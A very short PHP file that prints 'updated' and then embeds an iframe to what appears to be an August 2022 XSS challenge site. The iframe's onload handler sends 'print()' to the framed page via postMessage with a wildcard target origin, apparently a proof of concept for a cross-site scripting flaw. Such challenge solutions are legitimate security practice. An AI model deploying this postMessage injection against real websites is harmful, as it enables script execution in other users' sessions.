<?php
echo 'updated';
?>
<iframe src="https://august-2022-bc-xss-challenge.herokuapp.com/" onload="this.contentWindow.postMessage('print()','*')">
